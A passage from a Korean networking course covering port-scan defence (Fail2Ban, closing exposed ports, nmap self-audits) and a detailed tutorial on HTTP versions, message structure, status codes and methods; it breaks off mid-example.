**방안 2: Fail2Ban 사용**

```bash
# Fail2Ban 설치 (Ubuntu)
sudo apt install fail2ban

# 포트 스캔 차단 규칙 추가
sudo nano /etc/fail2ban/jail.local
```

`jail.local` 내용:
```ini
[portscan]
enabled = true
filter = portscan
logpath = /var/log/syslog
maxretry = 3
bantime = 86400
```

**방안 3: 포트 녹킹 (Port Knocking)**

- 특정 시퀀스로 포트를 두드려야만 서비스 접근 허용
- 예: 포트 1234, 5678, 9101을 순서대로 접근해야 SSH(22) 포트 열림

---

### 불필요한 포트 차단 체크리스트

#### 일반적으로 닫아야 할 포트

| 포트 | 서비스 | 이유 |
|:---:|:---:|:---:|
| **23** | Telnet | 암호화되지 않음, SSH 사용 권장 |
| **21** | FTP | 암호화되지 않음, SFTP 사용 권장 |
| **135** | MSRPC | Windows 원격 프로시저 호출, 외부 노출 금지 |
| **139, 445** | NetBIOS/SMB | 파일 공유, WannaCry 등 랜섬웨어 경로 |
| **3389** | RDP | 무차별 대입 공격 대상, VPN 통해서만 접근 |
| **3306** | MySQL | 데이터베이스는 로컬호스트만 허용 |
| **5432** | PostgreSQL | 데이터베이스는 로컬호스트만 허용 |
| **6379** | Redis | 인증 없이 노출 시 치명적 |
| **27017** | MongoDB | 인증 없이 노출 시 데이터 유출 |

#### 확인 방법

```bash
# 로컬 스캔
nmap -p 1-65535 127.0.0.1

# 외부 스캔 (공인 IP, DMZ)
nmap -p 1-65535 [공인 IP]
```

**비교**:
- 로컬 스캔: 내부에서 보이는 포트
- 외부 스캔: 인터넷에서 보이는 포트

**이상적인 상태**: 외부 스캔에서는 **필수 서비스(80, 443)만** 보여야 함

---

## ✅ 학습 체크리스트

- [ ] 포트 번호의 역할을 설명할 수 있다
- [ ] Well-Known, Registered, Dynamic Ports의 차이를 이해한다
- [ ] 포트 스캐닝의 필요성과 주기를 설명할 수 있다
- [ ] Nmap을 설치하고 기본 스캔을 수행할 수 있다
- [ ] TCP SYN Scan과 Connect Scan의 차이를 이해한다
- [ ] `-sV`, `-A`, `-p`, `-T` 옵션을 사용할 수 있다
- [ ] Windows에서 IIS 서비스를 활성화/비활성화할 수 있다
- [ ] services.msc를 사용하여 서비스를 관리할 수 있다
- [ ] 불필요한 포트를 식별하고 차단할 수 있다
- [ ] 포트 스캔 탐지 및 대응 방법을 이해한다

---

## 📋 핵심 요약

### 1. 포트 번호

**역할**: 하나의 호스트 내에서 **애플리케이션 식별**

**범위**:
- 0~1023: Well-Known (시스템) 포트
- 1024~49151: Registered (등록된) 포트
- 49152~65535: Dynamic (임시) 포트

**주요 포트**:
- HTTP(80), HTTPS(443), SSH(22), FTP(21), MySQL(3306), RDP(3389)

### 2. 포트 스캐닝

**목적**: 열린 포트 발견, 보안 점검

**주기**: 기업에서는 **분기당 1회 이상** 권장

**도구**: Nmap, Masscan, ZMap 등

### 3. Nmap 핵심 명령어

**기본 스캔**:
```bash
nmap 192.168.1.100
```

**빠르고 상세한 스캔**:
```bash
nmap -sS -sV -T4 -A 192.168.1.100
```

**전체 포트 스캔**:
```bash
nmap -p- 192.168.1.100
```

**서브넷 스캔**:
```bash
nmap 192.168.1.0/24
```

### 4. Windows 서비스 관리

**서비스 중지**:
```powershell
Stop-Service -Name W3SVC
Set-Service -Name W3SVC -StartupType Disabled
```

**서비스 시작**:
```powershell
Set-Service -Name W3SVC -StartupType Automatic
Start-Service -Name W3SVC
```

### 5. 보안 포인트

- 불필요한 포트는 **즉시 차단**
- 포트 스캔은 **내부 보안 점검 목적**으로만 사용
- IDS/IPS로 **포트 스캔 탐지** 및 차단
- 민감한 서비스(DB)는 **로컬호스트만** 허용

---

다음 섹션에서는 **HTTP 프로토콜의 심화 내용**을 학습합니다.
# Section 3: HTTP 프로토콜 심층 분석

## 🎯 학습 목표

이번 섹션에서는 다음 내용을 학습합니다:
- HTTP의 역사와 버전별 진화 과정 (1.0, 1.1, 2.0, 3.0)
- HTTP의 핵심 특징 (Connectionless, Stateless)
- Keep-Alive 메커니즘과 성능 최적화
- HTTP 메소드 완전 정복 (GET, POST, PUT, DELETE, HEAD, OPTIONS, TRACE, PATCH)
- Request/Response 메시지 구조 상세 분석
- 상태 코드(Status Code) 완벽 이해
- HTTP 헤더의 역할과 주요 헤더 필드
- 쿠키와 세션 관리 메커니즘
- URI/URL 구조와 차이점
- HTTP/2의 혁신적 기능 (Multiplexing, Header Compression, Server Push)
- HTTP/3와 QUIC 프로토콜의 미래

---

## 📚 HTTP란 무엇인가?

### HTTP의 정의

**HTTP (Hypertext Transfer Protocol)**는 1989년 영국의 **Tim Berners-Lee 경**이 개발한 **애플리케이션 계층 프로토콜**입니다.

**원래 목적**:
- HTML 문서를 다운로드하기 위한 프로토콜
- 웹 브라우저와 웹 서버 간의 통신 규약

**현재 사용**:
- HTML뿐만 아니라 **이미지, 동영상, JavaScript, CSS, JSON** 등 모든 웹 리소스 전송
- 현대 인터넷의 **핵심 프로토콜**
- 대부분의 웹 애플리케이션이 HTTP 기반

**프로토콜 스택 위치**:
```mermaid
graph TB
    A[애플리케이션 계층<br/>HTTP/HTTPS] --> B[표현 계층<br/>TLS/SSL 암호화]
    B --> C[전송 계층<br/>TCP/UDP]
    C --> D[네트워크 계층<br/>IP]
    D --> E[데이터링크 계층<br/>Ethernet]
    E --> F[물리 계층<br/>Cable/Wireless]
```

---

## 🔄 HTTP 버전의 진화

### HTTP 역사 타임라인

| 연도 | 버전 | 주요 특징 | 사용 현황 |
|:---:|:---:|:---:|:---:|
| **1991** | HTTP/0.9 | 단순한 GET 메소드만 지원 | 사용 안 함 |
| **1996** | HTTP/1.0 | 헤더, 상태 코드, POST 추가 | 거의 사용 안 함 |
| **1997** | HTTP/1.1 | Keep-Alive, 파이프라이닝 | 여전히 광범위하게 사용 |
| **2015** | HTTP/2 | 멀티플렉싱, 헤더 압축 | 점점 증가 중 |
| **2018** | HTTP/3 | QUIC(UDP 기반), 더 빠른 속도 | 최신 기술, 도입 확대 중 |

---

### HTTP/1.0 (1996년)

**핵심 특징**:
1. **단일 연결 방식**: 요청 1개당 TCP 연결 1개
2. **메소드 추가**: GET, POST, HEAD
3. **헤더 도입**: Content-Type, Content-Length 등
4. **상태 코드 도입**: 200 OK, 404 Not Found 등

**동작 방식**:
```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 웹 서버

    Note over Client,Server: 첫 번째 파일 요청
    Client->>Server: TCP 3-Way Handshake
    Client->>Server: GET /index.html HTTP/1.0
    Server->>Client: HTTP/1.0 200 OK + index.html
    Client->>Server: TCP 연결 종료 (FIN)

    Note over Client,Server: 두 번째 파일 요청 (이미지)
    Client->>Server: TCP 3-Way Handshake (새 연결!)
    Client->>Server: GET /logo.png HTTP/1.0
    Server->>Client: HTTP/1.0 200 OK + logo.png
    Client->>Server: TCP 연결 종료 (FIN)
```

**문제점**:
- **TCP 연결/종료 오버헤드**: 파일 10개 = TCP 연결 10개
- **3-Way Handshake 반복**: 매우 비효율적
- **성능 저하**: 웹 페이지 로딩 시간 증가

**예제**:
```http
GET /index.html HTTP/1.0
Host: www.example.com

HTTP/1.0 200 OK
Content-Type: text/html
Content-Length: 1234

<html>...</html>
```

---

### HTTP/1.1 (1997년) - 현재까지 가장 널리 사용

**핵심 개선사항**:
1. **Keep-Alive 기본 활성화**: 연결 재사용
2. **파이프라이닝**: 여러 요청을 순차적으로 전송 가능
3. **Host 헤더 필수**: 가상 호스팅 지원
4. **추가 메소드**: PUT, DELETE, OPTIONS, TRACE, CONNECT
5. **Chunked Transfer Encoding**: 동적 콘텐츠 스트리밍
6. **캐싱 강화**: ETag, Cache-Control

**Keep-Alive 동작**:
```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 웹 서버

    Client->>Server: TCP 3-Way Handshake
    Note over Client,Server: ✅ 연결 유지!

    Client->>Server: GET /index.html HTTP/1.1<br/>Connection: keep-alive
    Server->>Client: HTTP/1.1 200 OK + index.html

    Client->>Server: GET /style.css HTTP/1.1<br/>Connection: keep-alive
    Server->>Client: HTTP/1.1 200 OK + style.css

    Client->>Server: GET /logo.png HTTP/1.1<br/>Connection: keep-alive
    Server->>Client: HTTP/1.1 200 OK + logo.png

    Note over Client,Server: 일정 시간 후 자동 종료<br/>또는 Connection: close
```

**Keep-Alive 장점**:
- TCP 연결 재사용 → **3-Way Handshake 오버헤드 감소**
- 전체 페이지 로딩 시간 **30~50% 단축**
- 서버 리소스 절약

**Keep-Alive 설정 예시**:

**클라이언트 요청**:
```http
GET /index.html HTTP/1.1
Host: www.example.com
Connection: keep-alive
Keep-Alive: timeout=5, max=100
```

**서버 응답**:
```http
HTTP/1.1 200 OK
Connection: keep-alive
Keep-Alive: timeout=5, max=100
Content-Length: 1234

<html>...</html>
```

**파라미터 설명**:
- `timeout=5`: 연결 유지 시간 (5초)
- `max=100`: 최대 요청 수 (100개)

**Apache 서버 설정**:
```apache
KeepAlive On
MaxKeepAliveRequests 100
KeepAliveTimeout 5
```

**Nginx 서버 설정**:
```nginx
keepalive_timeout 5;
keepalive_requests 100;
```

**문제점**:
- **HOL (Head-of-Line) Blocking**: 앞선 요청이 지연되면 뒤의 요청도 대기
- **파이프라이닝 비활성화**: 대부분의 브라우저가 기본적으로 비활성화

---

### HTTP/2 (2015년) - 구글 SPDY 기반

**HTTP/2는 구글이 개발한 SPDY 프로토콜을 기반으로 표준화**되었습니다.

**핵심 기능**:

#### 1. 바이너리 프레이밍 (Binary Framing)

**HTTP/1.1**:
```http
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
```
→ **텍스트 기반** (사람이 읽기 쉬움)

**HTTP/2**:
```
10000010 00000000 00000001 ... (바이너리)
```
→ **바이너리 기반** (파싱 속도 향상, 오류 감소)

**프레임 구조**:
```
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31)                      |
+=+=============================================================+
|                   Frame Payload (0...)                      ...
+---------------------------------------------------------------+
```

#### 2. 멀티플렉싱 (Multiplexing)

**HTTP/1.1의 문제**:
```
요청1 ━━━━━━━━━━━> 응답1 ━━━━━━━━━━>
           요청2 ━━━━━━━━> 응답2 ━━━━>
                      요청3 ━━━> 응답3>
```
→ 순차적 처리 (HOL Blocking)

**HTTP/2의 해결**:
```
요청1 ━━━> ┓
요청2 ━━━> ┣━━━━━━━> 응답1, 응답2, 응답3 동시 처리
요청3 ━━━> ┛
```
→ **병렬 처리** (Single TCP Connection)

**스트림(Stream) 개념**:
```mermaid
graph LR
    A[TCP 연결] --> B[Stream 1<br/>index.html]
    A --> C[Stream 3<br/>style.css]
    A --> D[Stream 5<br/>logo.png]
    A --> E[Stream 7<br/>script.js]
```

**멀티플렉싱 장점**:
- **HOL Blocking 해결**: 모든 요청이 병렬 처리
- **연결 수 감소**: 도메인당 1개 연결로 충분
- **성능 향상**: 페이지 로딩 **50~70% 개선**

#### 3. 헤더 압축 (HPACK)

**HTTP/1.1의 문제**:
```http
GET /page1.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123xyz; user_pref=dark_mode

GET /page2.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123xyz; user_pref=dark_mode
```
→ **중복된 헤더**가 매번 전송 (수백 바이트 낭비)

**HTTP/2의 해결 (HPACK)**:
```
첫 번째 요청:
  [전체 헤더 전송 + 색인 테이블 구축]

두 번째 요청:
  [변경된 부분만 전송]
  :path: /page2.html (나머지는 색인 참조)
```

**HPACK 압축률**:
- 평균 **30~40%** 헤더 크기 감소
- 반복 요청 시 **80~90%** 감소

#### 4. 서버 푸시 (Server Push)

**HTTP/1.1**:
```
클라이언트: "index.html 주세요"
서버: [index.html 전송]
클라이언트: (HTML 파싱 후) "style.css 주세요"
서버: [style.css 전송]
클라이언트: (CSS 파싱 후) "logo.png 주세요"
서버: [logo.png 전송]
```
→ **왕복(Round-Trip) 여러 번 발생**

**HTTP/2 Server Push**:
```
클라이언트: "index.html 주세요"
서버: [index.html + style.css + logo.png 한 번에 전송!]
클라이언트: "오! 다 왔네?"
```

**Server Push 예제**:

**서버 구성 (Nginx)**:
```nginx
server {
    listen 443 ssl http2;

    location = /index.html {
        http2_push /style.css;
        http2_push /script.js;
        http2_push /logo.png;
    }
}
```

**프레임 흐름**:
```
서버 → 클라이언트: PUSH_PROMISE (Stream 2: style.css)
서버 → 클라이언트: PUSH_PROMISE (Stream 4: script.js)
서버 → 클라이언트: HEADERS + DATA (Stream 1: index.html)
서버 → 클라이언트: HEADERS + DATA (Stream 2: style.css)
서버 → 클라이언트: HEADERS + DATA (Stream 4: script.js)
```

**주의사항**:
- 클라이언트가 이미 캐시를 가지고 있으면 **대역폭 낭비**
- 신중하게 사용해야 함

#### 5. 우선순위 (Stream Prioritization)

**스트림별 우선순위 설정**:
```
HTML (우선순위: 256) ━━━━━━━━━>
CSS  (우선순위: 220) ━━━━━━>
JS   (우선순위: 220) ━━━━━━>
이미지 (우선순위: 32) ━>
```

**장점**:
- 중요한 리소스 먼저 로딩
- 사용자 체감 속도 향상

---

### HTTP/3 (2018년) - QUIC 기반

**HTTP/3은 구글이 개발한 QUIC 프로토콜을 기반**으로 합니다.

**가장 큰 변화**:
- **TCP 대신 UDP 사용**
- **QUIC (Quick UDP Internet Connections)** 프로토콜 도입

**프로토콜 스택 비교**:

**HTTP/1.1**:
```
HTTP/1.1
   ↓
TLS 1.2
   ↓
TCP
   ↓
IP
```

**HTTP/2**:
```
HTTP/2
   ↓
TLS 1.2+
   ↓
TCP
   ↓
IP
```

**HTTP/3**:
```
HTTP/3
   ↓
QUIC (TLS 1.3 내장)
   ↓
UDP
   ↓
IP
```

**핵심 기능**:

#### 1. 0-RTT 연결 수립

**HTTP/2 (TCP + TLS)**:
```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 서버

    Note over Client,Server: TCP 3-Way Handshake
    Client->>Server: SYN
    Server->>Client: SYN+ACK
    Client->>Server: ACK

    Note over Client,Server: TLS 1.2 Handshake
    Client->>Server: ClientHello
    Server->>Client: ServerHello, Certificate
    Client->>Server: KeyExchange, Finished
    Server->>Client: Finished

    Note over Client,Server: ✅ 데이터 전송 시작
    Client->>Server: HTTP Request
    Server->>Client: HTTP Response
```
→ **총 3 RTT (Round-Trip Time)** 필요

**HTTP/3 (QUIC + TLS 1.3)**:
```mermaid
sequenceDiagram
    participant Client as 클라이언트
    participant Server as 서버

    Note over Client,Server: QUIC + TLS 1.3 통합 Handshake
    Client->>Server: ClientHello + HTTP Request (0-RTT!)
    Server->>Client: ServerHello + HTTP Response

    Note over Client,Server: ✅ 데이터 전송 완료!
```
→ **총 0~1 RTT** (재연결 시 0-RTT!)

**성능 향상**:
- 초기 연결: **1 RTT** (HTTP/2는 3 RTT)
- 재연결: **0 RTT** (캐시된 세션 사용)
- **페이지 로딩 시간 30~50% 개선**

#### 2. 연결 마이그레이션 (Connection Migration)

**HTTP/2의 문제 (TCP)**:
```
Wi-Fi 연결: 192.168.1.100:54321 ↔ Server:443
          ↓
      (네트워크 변경)
          ↓
모바일 데이터: 203.0.113.50:60123 ↔ Server:443
          ↓
     ❌ TCP 연결 끊김!
     ↓
     재연결 필요 (3 RTT 다시)
```

**HTTP/3의 해결 (QUIC)**:
```
Wi-Fi 연결: 192.168.1.100:54321 ↔ Server:443
          (Connection ID: abc123xyz)
          ↓
      (네트워크 변경)
          ↓
모바일 데이터: 203.0.113.50:60123 ↔ Server:443
          (Connection ID: abc123xyz)
          ↓
     ✅ 연결 유지! (IP 변경 무관)
```

**Connection ID 개념**:
- TCP는 **4-tuple (Source IP, Source Port, Dest IP, Dest Port)**로 연결 식별
- QUIC는 **Connection ID**로 연결 식별
- IP 주소가 바뀌어도 **Connection ID가 동일하면 연결 유지**

**장점**:
- **모바일 환경에서 탁월**: Wi-Fi ↔ 모바일 데이터 전환 시 끊김 없음
- **기차, 버스에서 사용 시 유리**: 기지국 전환 시에도 연결 유지

#### 3. HOL Blocking 완전 해결

**HTTP/2의 문제 (TCP 레벨 HOL Blocking)**:
```
Stream 1: [패킷1] [패킷2] [패킷3 손실!] [패킷4]
Stream 2: [패킷1] [패킷2] [패킷3] [패킷4]
                    ↓
         TCP는 순서 보장을 위해
         패킷3이 재전송될 때까지
         Stream 2의 모든 패킷 대기!
```

**HTTP/3의 해결 (QUIC)**:
```
Stream 1: [패킷1] [패킷2] [패킷3 손실!] [패킷4]
Stream 2: [패킷1] [패킷2] [패킷3] [패킷4] ✅ 전달됨!
                    ↓
         Stream 2는 독립적으로 처리
         Stream 1만 대기
```

**성능 향상**:
- 패킷 손실 시에도 **다른 스트림은 정상 처리**
- **불안정한 네트워크에서 성능 우수**

#### 4. 기본 암호화 (TLS 1.3 내장)

**HTTP/2**:
```
HTTP/2 (암호화 선택 사항)
   ↓
TLS 1.2+ (선택)
   ↓
TCP
```

**HTTP/3**:
```
HTTP/3 (암호화 필수!)
   ↓
QUIC (TLS 1.3 내장)
   ↓
UDP
```

**암호화 범위**:
- **페이로드 전체 암호화**
- **일부 헤더만 평문** (버전 협상, Connection ID)
- **보안 강화**

---

## 📝 HTTP 메시지 구조

### Request 메시지 상세 분석

**기본 구조**:
```http
[Request Line]
[Headers]
[빈 줄]
[Body]
```

**실제 예제**:
```http
GET /api/users/123 HTTP/1.1
Host: api.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: session_id=abc123xyz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

```

**구성 요소 상세**:

#### 1. Request Line
```
GET /api/users/123 HTTP/1.1
```
- **Method**: GET
- **Request Target**: /api/users/123
- **HTTP Version**: HTTP/1.1

#### 2. Request Headers

**Host** (필수 - HTTP/1.1):
```http
Host: api.example.com
```
- 요청 대상 서버의 호스트명
- 가상 호스팅을 위해 **반드시 필요**

**User-Agent**:
```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```
- 클라이언트(브라우저) 정보
- OS, 브라우저 종류, 버전 등

**Accept**:
```http
Accept: application/json, text/html, */*
```
- 클라이언트가 수용 가능한 콘텐츠 타입
- `q` 파라미터로 우선순위 지정 가능

**Accept-Language**:
```http
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8
```
- 선호하는 언어
- 다국어 사이트에서 언어 자동 선택

**Accept-Encoding**:
```http
Accept-Encoding: gzip, deflate, br
```
- 지원하는 압축 방식
- `gzip`, `deflate`, `br`(Brotli)

**Connection**:
```http
Connection: keep-alive
```
- 연결 유지 여부
- `keep-alive` 또는 `close`

**Cookie**:
```http
Cookie: session_id=abc123xyz; user_pref=dark_mode
```
- 서버가 이전에 Set-Cookie로 설정한 값
- 세션 관리, 사용자 인증

**Authorization**:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```
- 인증 정보 (토큰, Basic Auth 등)

**Referer**:
```http
Referer: https://www.google.com/search?q=example
```
- 현재 요청을 시작한 이전 페이지 URL
- 분석, 보안에 활용

#### 3. Request Body (POST, PUT 등)

**Form 데이터**:
```http
POST /api/login HTTP/1.1
Host: api.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=12345
```

**JSON 데이터**:
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 58

{
  "name": "홍길동",
  "email": "hong@example.com"
}
```

**파일 업로드 (Multipart)**:
```http
POST /api/upload HTTP/1.1
Host: api.example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 1234

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

[바이너리 데이터]
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

---

### Response 메시지 상세 분석

**기본 구조**:
```http
[Status Line]
[Headers]
[빈 줄]
[Body]
```

**실제 예제**:
```http
HTTP/1.1 200 OK
Date: Mon, 02 Dec 2024 09:00:00 GMT
Server: nginx/1.20.1
Content-Type: application/json; charset=utf-8
Content-Length: 128
Connection: keep-alive
Cache-Control: max-age=3600
ETag: "abc123xyz"
Set-Cookie: session_id=xyz789abc; Path=/; HttpOnly; Secure
Access-Control-Allow-Origin: *

{
  "id": 123,
  "name": "홍길동",
  "email": "hong@example.com"
}
```

**구성 요소 상세**:

#### 1. Status Line
```
HTTP/1.1 200 OK
```
- **HTTP Version**: HTTP/1.1
- **Status Code**: 200
- **Reason Phrase**: OK

#### 2. Response Headers

**Date**:
```http
Date: Mon, 02 Dec 2024 09:00:00 GMT
```
- 응답 생성 시각

**Server**:
```http
Server: nginx/1.20.1
```
- 웹 서버 소프트웨어 정보
- 보안상 숨기는 경우도 많음

**Content-Type**:
```http
Content-Type: application/json; charset=utf-8
```
- 응답 본문의 MIME 타입
- `text/html`, `application/json`, `image/jpeg` 등

**Content-Length**:
```http
Content-Length: 128
```
- 본문 크기 (바이트)

**Cache-Control**:
```http
Cache-Control: max-age=3600, public
```
- 캐싱 정책
- `max-age=3600`: 3600초(1시간) 동안 캐시
- `public`: 모든 캐시에서 저장 가능
- `private`: 브라우저 캐시만 가능
- `no-cache`: 항상 재검증
- `no-store`: 캐시 금지

**ETag**:
```http
ETag: "abc123xyz"
```
- 리소스 버전 식별자
- 캐시 검증에 사용

**Set-Cookie**:
```http
Set-Cookie: session_id=xyz789abc; Path=/; HttpOnly; Secure; SameSite=Strict
```
- 클라이언트에 쿠키 설정
- `HttpOnly`: JavaScript 접근 차단 (XSS 방지)
- `Secure`: HTTPS에서만 전송
- `SameSite`: CSRF 방지

**Access-Control-Allow-Origin**:
```http
Access-Control-Allow-Origin: *
```
- CORS (Cross-Origin Resource Sharing) 정책
- `*`: 모든 도메인 허용
- `https://example.com`: 특정 도메인만 허용

#### 3. Response Body

응답 본문 (HTML, JSON, 이미지 등)

---

## 🔢 HTTP 상태 코드 (Status Code)

### 상태 코드 분류

| 범위 | 의미 | 설명 |
|:---:|:---:|:---:|
| **1xx** | Informational | 정보성 응답 (요청 받음, 처리 중) |
| **2xx** | Success | 성공 (요청 정상 처리) |
| **3xx** | Redirection | 리다이렉션 (추가 조치 필요) |
| **4xx** | Client Error | 클라이언트 오류 (잘못된 요청) |
| **5xx** | Server Error | 서버 오류 (서버 처리 실패) |

---

### 2xx 성공 (Success)

**200 OK**:
```http
HTTP/1.1 200 OK
Content-Type: text/html

<html>...</html>
```
- 요청 성공
- 가장 일반적인 응답

**201 Created**:
```http
HTTP/1.1 201 Created
Location: /api/users/124

{
  "id": 124,
  "name": "새 사용자"
}
```
- 리소스 생성 성공 (POST)
- `Location` 헤더에 새 리소스 URL

**204 No Content**:
```http
HTTP/1.1 204 No Content
```
- 요청 성공, 본문 없음
- DELETE 요청 후 많이 사용

**206 Partial Content**:
```http
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/2048

[부분 데이터]
```
- 범위 요청 성공
- 동영상 스트리밍, 파일 다운로드 재개

---

### 3xx 리다이렉션 (Redirection)

**301 Moved Permanently**:
```http
HTTP/1.1 301 Moved Permanently
Location: https://www.example.com/new-page
```
- 영구적 이동
- 검색엔진도 새 URL로 인덱싱

**302 Found**:
```http
HTTP/1.1 302 Found
Location: https://www.example.com/temp-page
```
- 임시 이동
- 원래 URL 유지

**304 Not Modified**:
```http
HTTP/1.1 304 Not Modified
ETag: "abc123xyz"
```
- 캐시된 버전 사용 가능
- 본문 전송 안 함 (대역폭 절약)

**307 Temporary Redirect**:
- 302와 유사하지만 **메소드 변경 금지**
- POST 요청 시 POST 유지

**308 Permanent Redirect**:
- 301과 유사하지만 **메소드 변경 금지**

---

### 4xx 클라이언트 오류 (Client Error)

**400 Bad Request**:
```http
HTTP/1.1 400 Bad Request

{
  "error": "Invalid JSON syntax"
}
```
- 잘못된 요청 문법

**401 Unauthorized**:
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Bearer realm="example"

{
  "error": "Authentication required"
}
```
- 인증 필요 (로그인 필요)

**403 Forbidden**:
```http
HTTP/1.1 403 Forbidden

{
  "error": "Access denied"
}
```
- 권한 없음 (인증됐지만 권한 부족)

**404 Not Found**:
```http
HTTP/1.1 404 Not Found

{
  "error": "Resource not found"
}
```
- 리소스를 찾을 수 없음

**405 Method Not Allowed**:
```http
HTTP/1.1 405 Method Not Allowed
Allow: GET, POST

{
  "error": "DELETE method not allowed"
}
```
- 허용되지 않는 메소드

**429 Too Many Requests**:
```http
HTTP/1.1 429 Too Many Requests
Retry-After: 60

{
  "error": "Rate limit exceeded"
}
```
- 요청 횟수 제한 초과

---

### 5xx 서버 오류 (Server Error)

**500 Internal Server Error**:
```http
HTTP/1.1 500 Internal Server Error

{
  "error": "An unexpected error occurred"
}
```
- 서버 내부 오류 (프로그램 버그 등)

**502 Bad Gateway**:
```http
HTTP/1.1 502 Bad Gateway

{
  "error": "Upstream server error"
}
```
- 게이트웨이/프록시에서 업스트림 서버 오류

**503 Service Unavailable**:
```http
HTTP/1.1 503 Service Unavailable
Retry-After: 120

{
  "error": "Service temporarily unavailable"
}
```
- 서비스 일시 중단 (유지보수, 과부하)

**504 Gateway Timeout**:
```http
HTTP/1.1 504 Gateway Timeout

{
  "error": "Upstream server timeout"
}
```
- 게이트웨이/프록시 타임아웃

---

## 🛠️ HTTP 메소드 (Methods)

### 주요 메소드 상세

| 메소드 | 의미 | Idempotent | Safe | Body |
|:---:|:---:|:---:|:---:|:---:|
| **GET** | 조회 | ✅ | ✅ | ❌ |
| **POST** | 생성/처리 | ❌ | ❌ | ✅ |
| **PUT** | 전체 수정 | ✅ | ❌ | ✅ |
| **PATCH** | 부분 수정 | ❌ | ❌ | ✅ |
| **DELETE** | 삭제 | ✅ | ❌ | ❌ |
| **HEAD** | 헤더만 조회 | ✅ | ✅ | ❌ |
| **OPTIONS** | 지원 메소드 조회 | ✅ | ✅ | ❌ |

**용어 설명**:
- **Idempotent (멱등성)**: 동일 요청을 여러 번 해도 결과가 같음
- **Safe (안전)**: 서버 상태를 변경하지 않음

---

### GET

**용도**: 리소스 조회

**특징**:
- 쿼리 스트링으로 데이터 전달
- 캐시 가능
- 브라우저 히스토리에 남음

**예제**:
```http
GET /api/users?page=1&limit=10 HTTP/1.1
Host: api.example.com
```

**응답**:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "users": [
    {"id": 1, "name": "홍길동"},
    {"id": 2, "name": "김철수"}
  ],
  "total": 100
}
```

---

### POST

**용도**: 리소스 생성, 데이터 처리

**특징**:
- 요청 본문에 데이터 전달
- **멱등성 없음** (여러 번 요청 시 여러 개 생성)
- 캐시 불가

**예제**:
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "name": "홍길동",
  "email": "hong@example.com"
}
```

**응답**:
```http
HTTP/1.1 201 Created
Location: /api/users/124

{
  "id": 124,
  "name": "홍길동",
  "email": "hong@example.com"
}
```

---

### PUT

**용도**: 리소스 전체 교체

**특징**:
- **멱등성 있음** (여러 번 요청 시 결과 동일)
- 리소스 전체를 새 데이터로 교체

**예제**:
```http
PUT /api/users/124 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "name": "홍길동(수정)",
  "email": "hong_new@example.com"
}
```

**응답**:
```http
HTTP/1.1 200 OK

{
  "id": 124,
  "name": "홍길동(수정)",
  "email": "hong_new@example.com"
}
```

---

### PATCH

**용도**: 리소스 부분 수정

**특징**:
- 일부 필드만 수정
- PUT보다 효율적

**예제**:
```http
PATCH /api/users/124 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "email": "hong_updated@example.com"
}
```

**응답**:
```http
HTTP/1.1 200 OK

{
  "id": 124,
  "name": "홍길동",
  "email": "hong_updated@example.com"
}
```

---

### DELETE

**용도**: 리소스 삭제

**특징**:
- **멱등성 있음** (여러 번 삭제해도 결과 동일)

**예제**:
```http
DELETE /api/users/124 HTTP/1.1
Host: api.example.com
```

**응답**:
```http
HTTP/1.1 204 No Content
```

또는:
```http
HTTP/1.1 200 OK

{
  "message": "User deleted successfully"
}
```

---

### HEAD

**용도**: GET과 동일하지만 **헤더만** 반환

**특징**:
- 본문 없음
- 파일 크기 확인, 리소스 존재 여부 확인

**예제**:
```http
HEAD /large-file.zip HTTP/1.1
Host: download.example.com
```

**응답**:
```http
HTTP/1.1 200 OK
Content-Length: 104857600
Content-Type: application/zip
Last-Modified: Mon, 01 Dec 2024 10:00:00 GMT
```

---

### OPTIONS

**용도**: 서버가 지원하는 메소드 확인

**특징**:
- CORS preflight 요청에 사용
- 지원 메소드 확인

**예제**:
```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com
Origin: https://client.example.com
```

**응답**:
```http
HTTP/1.1 204 No Content
Allow: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Origin: https://client.example.com
